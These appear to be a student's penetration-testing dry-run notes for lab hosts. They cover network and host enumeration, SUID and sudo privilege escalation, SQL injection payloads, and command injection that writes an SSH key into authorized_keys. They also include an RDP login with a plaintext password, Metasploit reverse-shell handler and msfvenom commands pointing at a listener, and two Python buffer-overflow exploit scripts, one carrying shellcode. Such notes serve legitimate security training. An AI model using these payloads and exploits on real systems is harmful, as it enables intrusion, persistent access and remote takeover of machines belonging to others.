## Dry Run Notes

### Network Enumeration
```
nmap -v -sT -Pn -T4 -sV <ipaddr>,<ipaddr_2>
```

```
whereis ping = <path>/ping
for i in {1..254}; do (/<path>/ping -c 1 192.168.1.$i | grep "bytes from" &); done
```	
### Host Enumeration
	0) File Enum
		/etc/hosts
		/etc/passwd
	
	1) Persistence
		i) crontab
			run-parts will run evetyhing in directory
		
	2) Priv Esc via SUDO / SUID / SGID
		i)	X = 4000 (SUID) : 2000 (SGID) : 6000 (Either / Both )
```
find / -type f -perm /X -ls 2>/dev/null
```	
		ii) 	sudo -l
	
	3) Situational Awareness
		whos on the box
		arp -a
		ping it again
	
### Web Injection
	http://10.50.31.75/robots.txt -> Robots.txt -> /path -> Directory Traversal
	http://10.50.31.75/cmdinjection -> cmd injection
	http://10.50.40.114 SQL injection
	http://10.50.40.114/Union.html -> SQl Injection
		Find Vulnerable Page
		
			Selection=2 or 1=1
			Selection=2 or 1=1;
			Selection=2 or 1=1; #
		
		Check tables
```
			<category>=<#> UNION sellect 1,2,3,...X ;
```	
		Golden Statment
			UNION select <>,<>,<> from information_schema.columns ; #make it reflect as database,table,col.
			UNION select <column>,<column2>,..,<columnX> from <database>.<table>
		
		Find Version
			Selection=2 UNION select 1,2,@@version ;
	
	CMD Injection -> SSH Keygen
		Lin>
			ssh-keygen -t rsa -b 4096
			y, blank, blank
			cd .ssh/
			cat id_rsa.pub
			"copy ENTIRE thing"
		Web>
			cat /etc/passwd, find the home dir
			; ls -la /var/www/
			; mkdir /var/www/.ssh
			; ls -la /var/www/
			; echo "<id_rsa.pub>" > /var/www/.ssh/authorized_keys
			; cat /var/www/.ssh/authorized_keys
		Lin>
			ssh -i id_rsa www-data@10.50.31.75
			
	Uploads
		1) Can you upload
		2) Is it santized
		3) Can you reach it
###	

	Look at the websites found from the nmap scan below
		nmap -v -sT -Pn -T4 -sV --script=http-enum.nse <webserver> -p 80
	Check for robots.txt
		http://<ip>/robots.txt
	Directory Traversal
		Just gets information about the box
		
		Something that reads something, probably vulnerable to directory traversal
			../../../../../../
			1) etc/passwd, etc/hosts, etc/resolv.conf, etc/groups
		view page source to get good view of the files
	
	SQL Injection
		If you see username, password, SQL injection
		If you see radio buttons
	
		Post Method
			username=tom' OR 1=1'
			password=tom' OR 1=1'
			
		Get Method
			F12 -> Network -> [Hit Login] -> Click Post Request -> Request
			Switch to Raw -> [Copy String] enter to URL
				http://<ip>/<>.php?[Copied String]
			View Page Source
			Passwords are going to be Rot13 / Base64 Encoded
		
		Test if SQL Injection will work
			.php?<category>=<number> OR 1=1 ;
		
		If it does work, see what kind of stuff it needs
		See how the SQL is organized, 1,2,3 shows 1,3,2
			.php?<category>=<number> UNION select 1,2,X..;
			 
		Find the Tables
			.php?<category>=<number> UNION select table_schema,column_name,table_name FROM information_schema.columns;
			
		How many Tables are in the Schema, coount the table_schemas, those
		are the databases
			mysql, information_schema, ..
		
		Look for the non-default ones which are always at the bottom
			.php?<category>=<number> UNION select <Field1>,<Field1>,<Field2> from <table>; 
			.php?<category>=<number> UNION select user_id,name,username from siteusers; 
			
			
			
		
	Command injection
		Any other field, do command injection
		; <command>
 

### Linux

####

####

### Windows
	if 3389 is open, try and rdp into it
		xfreerdp /u:Lroth /p:anotherpassword4THEages /dynamic-resolution +clipboard /v:127.0.0.1:[port]
	
	Host Enum
		Cmdline
			whoami
			net users
			net group
			net localgroup
			net localgroup administrators see if you are in the group
		
		Registry
			Look at the regedit.exe for RUN, RUNONCE, for HKLM and HKCU
		
		Services
			Look for services that are lazily configured, aka no desc, weird name, etc.
			
		Scheduled Tasks
			Look at action at poorly configured tasks, can see what is going on
		
		Look in directories
			If something is running at a certain place in the file system, see if you can edit in 
			there and rename the og file, and name your file that name and make a payload
		
	MSFconsole
		use multi/handler
		set payload windows/meterpreter/reverse_tcp
		set lhost 0.0.0.0
		set lport 4444
		exploit -> will start the listening for the reverse shell
		
		
#### Llinux IF LINUX HAS GDB DO BUFF OVERFLOW!!!!!!!!!!!!!!!!!!!!!!!

1) Run the func
2) Understand how it takes, command lind arg, user input
	if it takes user input <<<$(echo "")
3) run gdb to find eip and esp registers, wiremask.eu, tools, buff overflow
	gdb ./func <<<$(echo "buff overflow pattern")
4) find eip register, take back to wiremask.eu, get bite offset
	"in script" -> get the byte offset
		buf = "A" * 62
5) env - gdb ./func to find the jmp register
	show env
	unset env COLUMNS
	unset env LINES
	show env
6) run "Enough to crash it"
7) info proc map
8) find /b <1st Mem Addr After Heap> <Last Mem Addr Before Stack>
	copy those into script
	```
	0xf7de3b59  
	0xf7f588ab
	0xf7f645fb
	0xf7f6460f
	0xf7f64aeb
	```
9) Make little Endian
	0xf7de3b59 ->
	buf += "\x59\x3b\xde\xf7"
	
10) NO-OP Sled
	buf +="\x90" * 10
	
11) Create Payload via msfvenom
	msfvenom -p linux/x86/exec CMD='whoami [&& ifconfig]' -b '\x00' -f python
	msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=<linops> lport=4444 -b '\x00' -f python
	need the multi handler
	msfconsole
	use multi/handler
	set payload linux/x86/meterpreter/reverse_tcp 
	set lhost 0.0.0.0
	set lport 4444
	exploit -> will start the listening for the reverse shell
12) put in script ^^
	
#!/usr/bin/python2.7

# Fill UP THE BUFFER
buf = "A" * 62

# EIP REGISTER TO JMP ESP
buf += "\x59\x3b\xde\xf7"

'''
JMP ESP addresses
0xf7de3b59  
0xf7f588ab
0xf7f645fb
0xf7f6460f
0xf7f64aeb
'''
# assisti with encoding NOP SLED
buf +="\x90" * 10
```
msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
```

# Shell Code / Payload below
buf += b"\xdb\xd8\xbe\x34\xcb\x24\x47\xd9\x74\x24\xf4\x58"
buf += b"\x31\xc9\xb1\x0e\x31\x70\x19\x83\xe8\xfc\x03\x70"
buf += b"\x15\xd6\x3e\x4e\x4c\x4e\x58\xdd\x34\x06\x77\x81"
buf += b"\x31\x31\xef\x6a\x31\xd5\xf0\x1c\x9a\x47\x98\xb2"
buf += b"\x6d\x64\x08\xa3\x7d\x6a\xad\x33\xeb\x0c\xce\x5c"
buf += b"\x85\xb6\x79\xc4\x79\x10\x5c\x2a\x0d\x34\xcf\x4b"
buf += b"\x9c\xad\x0f\xdb\x0d\xa4\xf1\x2e\x31"

print(buf)



#### Windows
#!/usr/bin/python2.7

import socket

'''
625011AF
625011BB
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.40.22 lport=4444 -b "\x00" -f python --> Payload
'''


buf = "TRUN /.:/" #Exploit
buf += "A" * 2003 #Buffer Offset
buf += "\xa0\x12\x50\x62"  #JMP ESP
buf += "\x90" * 15 #NOP SLED
buf += #SHELLCODE HERE
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) # Creates IPv4 socket

s.connect(("0.0.0.0",PORTHERE))    #IP and port to connect to
print s.recv(1024)   #print response
s.send(buf)       #sends the variable buf
print s.recv(1024)   #print response
s.close()         #close the connection








































####
